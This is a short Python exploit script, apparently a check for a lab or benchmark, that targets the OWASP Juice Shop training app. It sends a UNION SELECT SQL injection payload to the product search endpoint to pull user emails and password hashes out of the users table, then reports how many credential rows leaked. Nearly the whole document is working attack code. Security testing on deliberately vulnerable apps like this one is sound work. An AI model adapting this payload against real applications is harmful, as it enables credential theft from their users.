"""SQL injection in the raw product search query of routes/search.ts.

Same UNION SELECT payload as Juice Shop's own API test ("search can create
UNION SELECT with Users table and required columns", test/api/search.test.ts):
it appends the Users table to the product results. Success: an admin credential
row (email + password hash) appears among the search results.
"""

import json
import urllib.parse
import urllib.request


def exploit(base: str) -> tuple[bool, str]:
    q = "')) union select id,'2','3',email,password,'6','7','8','9' from users--"
    url = f"{base}/rest/products/search?q={urllib.parse.quote(q)}"
    with urllib.request.urlopen(url) as res:
        rows = json.load(res).get("data", [])
    leaked = [r for r in rows if isinstance(r.get("price"), str) and "@juice-sh.op" in r["price"]]
    return len(leaked) > 0, f"{len(leaked)} credential rows leaked"
